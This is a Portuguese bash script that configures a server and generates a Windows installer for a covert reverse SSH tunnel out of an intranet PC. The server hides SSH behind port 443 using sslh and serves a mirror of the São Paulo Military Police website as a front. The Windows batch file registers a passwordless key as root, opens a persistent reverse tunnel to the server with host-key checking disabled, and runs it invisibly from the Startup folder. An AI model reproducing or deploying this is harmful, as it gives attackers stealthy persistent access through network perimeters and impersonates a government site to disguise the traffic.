#!/bin/bash

# Cores para interface
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

clear
echo -e "${BLUE}======================================================${NC}"
echo -e "${BLUE}    GERADOR DE TUNNEL REVERSO - NUCLEO TELEMATICA     ${NC}"
echo -e "${BLUE}======================================================${NC}"

# 1. VERIFICAÇÃO DE ROOT
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[ERRO] Este script precisa rodar como ROOT.${NC}"
   exit 1
fi

# 2. DETECÇÃO DE IP PÚBLICO
echo -e "${YELLOW}[*] Detectando IPv4 Publico...${NC}"
PUBLIC_IP=$(curl -s -4 ifconfig.me || curl -s -4 icanhazip.com)
if [[ -z "$PUBLIC_IP" ]]; then
    echo -e "${RED}[ERRO] Falha ao detectar IP externo.${NC}"
    exit 1
fi
echo -e "${GREEN}    -> IP Encontrado: $PUBLIC_IP${NC}"

# 3. CONFIGURAÇÃO DE PORTAS
PORT_EXTERNA=443
PORT_SSH_LOCAL=22
PORT_HTTP_DISFARCE=8080
PORT_REVERSA_INTRANET=1080 # Porta no servidor para acessar a intranet

# 4. INSTALAÇÃO E MODULOS DO APACHE
echo -e "${YELLOW}[*] Instalando dependencias e configurando Proxy...${NC}"
apt-get update -qq && apt-get install -y -qq sslh apache2 openssh-server wget > /dev/null
a2enmod proxy proxy_http > /dev/null 2>&1

# 5. CONFIGURACAO DO DISFARCE (ESPELHAMENTO PMESP)
echo -e "${YELLOW}[*] Configurando espelhamento: https://policiamilitar.sp.gov.br/${NC}"

echo "Listen 127.0.0.1:$PORT_HTTP_DISFARCE" > /etc/apache2/ports.conf

cat > /etc/apache2/sites-available/000-default.conf <<EOF
<VirtualHost 127.0.0.1:$PORT_HTTP_DISFARCE>
    ServerName $PUBLIC_IP

    ProxyPreserveHost Off
    ProxyPass / https://www.policiamilitar.sp.gov.br/
    ProxyPassReverse / https://www.policiamilitar.sp.gov.br/

    # Ajuste de SSL para o proxy funcionar com o site oficial
    SSLProxyEngine on
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off
    SSLProxyCheckPeerExpire off

    ErrorLog \${APACHE_LOG_DIR}/error.log
    CustomLog \${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
EOF

systemctl restart apache2 > /dev/null

# 6. CONFIGURAÇÃO DO SSLH (MULTIPLEXADOR)
cat > /etc/default/sslh <<EOF
RUN=yes
DAEMON=/usr/sbin/sslh
DAEMON_OPTS="--user sslh --listen 0.0.0.0:$PORT_EXTERNA --ssh 127.0.0.1:$PORT_SSH_LOCAL --http 127.0.0.1:$PORT_HTTP_DISFARCE --pidfile /var/run/sslh/sslh.pid"
EOF
systemctl restart sslh

# 7. AJUSTE SSHD (GATEWAY PORTS)
sed -i 's/#GatewayPorts no/GatewayPorts yes/' /etc/ssh/sshd_config
sed -i 's/GatewayPorts no/GatewayPorts yes/' /etc/ssh/sshd_config
systemctl restart ssh

# 8. GERAÇÃO DO INSTALADOR WINDOWS (.BAT)
CLIENT_FILE="instalar_servico_intranet.bat"

cat <<EOF > $CLIENT_FILE
@echo off
title INSTALADOR TUNNEL SSH - STARTUP
setlocal enabledelayedexpansion

:: --- DADOS DO SERVIDOR ---
set SERVER_IP=$PUBLIC_IP
set PORT=$PORT_EXTERNA
set USER_SSH=root
set FOLDER=%APPDATA%\SSHTunnel
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
:: -------------------------

echo [+] Criando pasta em %FOLDER%...
if not exist "%FOLDER%" mkdir "%FOLDER%"

:: GESTAO DE CHAVE SSH (Evita pedir senha no loop invisivel)
if not exist "%USERPROFILE%\.ssh\id_rsa" (
    echo [+] Gerando chave de identidade...
    ssh-keygen -t rsa -b 2048 -f "%USERPROFILE%\.ssh\id_rsa" -N "" -q
)

echo.
echo [!] AUTORIZACAO: Digite a senha do servidor para permitir conexao automatica.
echo.
type "%USERPROFILE%\.ssh\id_rsa.pub" | ssh -p %PORT% -o StrictHostKeyChecking=no %USER_SSH%@%SERVER_IP% "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"

echo [+] Gerando script de persistencia...
(
echo @echo off
echo :LOOP
echo echo [%%date%% %%time%%] Conectando...
echo ssh -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -p %PORT% -N -R $PORT_REVERSA_INTRANET:localhost:22 %USER_SSH%@%SERVER_IP%
echo timeout /t 15
echo goto LOOP
) > "%FOLDER%\tunnel.bat"

echo [+] Criando inicializador invisivel...
(
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Run "cmd.exe /c ""%FOLDER%\tunnel.bat""", 0, False
) > "%FOLDER%\start_tunnel.vbs"

copy /y "%FOLDER%\start_tunnel.vbs" "%STARTUP_FOLDER%\start_tunnel.vbs" >nul

echo.
echo ---------------------------------------------------
echo [+] INSTALACAO CONCLUIDA!
echo ---------------------------------------------------
echo [!] O tunnel iniciara com o Windows.
echo.
set /p opt="Deseja iniciar agora em segundo plano? (S/N): "
if /i "%opt%"=="S" (
    start wscript.exe "%STARTUP_FOLDER%\start_tunnel.vbs"
    echo [+] Executando...
)
timeout /t 5
exit
EOF

# 9. FINALIZAÇÃO
echo -e "${GREEN}======================================================${NC}"
echo -e " SERVIDOR CONFIGURADO COM SUCESSO"
echo -e "======================================================${NC}"
echo -e " IP Servidor: ${BLUE}$PUBLIC_IP${NC}"
echo -e " Porta Externa: ${BLUE}$PORT_EXTERNA${NC} (Disfarçada de HTTPS)"
echo -e " Site de Fachada: ${BLUE}Portal PMESP Ativado${NC}"
echo -e " Porta de Acesso Interno (no servidor): ${BLUE}$PORT_REVERSA_INTRANET${NC}"
echo -e "======================================================"
echo -e "${YELLOW}>>> ARQUIVO CLIENTE GERADO: $CLIENT_FILE${NC}"
echo " Copie este arquivo para o PC da Intranet e execute como Admin."
